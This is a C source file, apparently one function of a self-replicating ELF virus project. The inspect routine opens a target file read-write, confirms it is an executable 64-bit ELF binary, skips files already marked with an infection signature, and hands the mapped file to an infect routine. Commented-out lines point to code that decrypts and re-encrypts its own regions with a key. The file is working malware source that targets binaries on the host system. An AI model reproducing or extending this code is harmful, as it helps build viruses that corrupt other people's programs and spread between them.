#include "war.h"

void	inspect(t_data *data, char *path)
{
//	revert_two(&data->key, (char*)locate, (size_t)inspect - (size_t)locate);
//	update_two(&data->key, (char*)inspect, (size_t)infect - (size_t)inspect);
//	printf("inspect key = %lx\n", data->key.two);

	char de[] = "inspect\n";
	_write(1, de, 8);

	if (data->context != true)
		goto ERR;

	struct stat st;

  	if ((data->bin.fd = _open(path, O_RDWR, 0000)) < 0)
		goto ERR;
	if (_fstat(data->bin.fd, &st) < 0)
		goto ERR;
	if (!(st.st_mode & S_IXUSR))
		goto ERR;
	if ((data->bin.map = _mmap(NULL, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, data->bin.fd, 0)) == MAP_FAILED)
		goto ERR;

	data->bin.size = st.st_size;
	data->header = (Elf64_Ehdr*)data->bin.map;
	if ((*((unsigned char*)data->header + EI_MAG0) != ELFMAG0) || \
		(*((unsigned char*)data->header + EI_MAG1) != ELFMAG1) || \
		(*((unsigned char*)data->header + EI_MAG2) != ELFMAG2) || \
		(*((unsigned char*)data->header + EI_MAG3) != ELFMAG3) || \
		(*((unsigned char*)data->header + EI_CLASS) != ELFCLASS64) || \
		(*(uint32_t*)&data->header->e_ident[EI_PAD] == SIGNATURE))
	{
		_munmap(data->bin.map, st.st_size);
		goto ERR;
	}
	data->context = true;

	_write(1, path, _strlen(path));
	char de2[] = "\n";
	_write(1, de2, 1);

ERR:
//	revert_two(&data->key, (char*)infect, (size_t)inject - (size_t)infect);
	infect(data);
}
